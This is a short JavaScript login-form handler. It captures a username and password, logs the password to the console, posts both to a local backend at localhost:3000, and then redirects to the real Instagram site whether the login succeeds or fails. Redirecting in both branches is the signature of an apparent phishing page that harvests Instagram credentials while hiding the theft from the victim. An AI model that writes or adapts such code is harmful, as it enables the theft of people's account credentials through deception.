// Handle form submission
document
  .getElementById("login-form")
  .addEventListener("submit", function (event) {
    event.preventDefault(); // Prevent the form from submitting the default way

    // Get the username and password values
    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    console.log("Username:", username);
    console.log("Password:", password); // Check if this is being logged correctly

    // Prepare data to send to the backend
    const loginData = { username, password };

    // Send the data to the backend server
    fetch("http://localhost:3000/login", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(loginData),
    })
      .then((response) => response.json())
      .then((data) => {
        console.log(data); // Log the response from the server

        // If login is successful, redirect to Instagram
        if (data.success) {
          window.location.href = "https://www.instagram.com"; // Redirect to Instagram page
        } else {
          window.location.href = "https://www.instagram.com"; // Redirect to Instagram page
        }
      })
      .catch((error) => {
        console.error("Error:", error);
        alert("Error occurred during login");
      });
  });
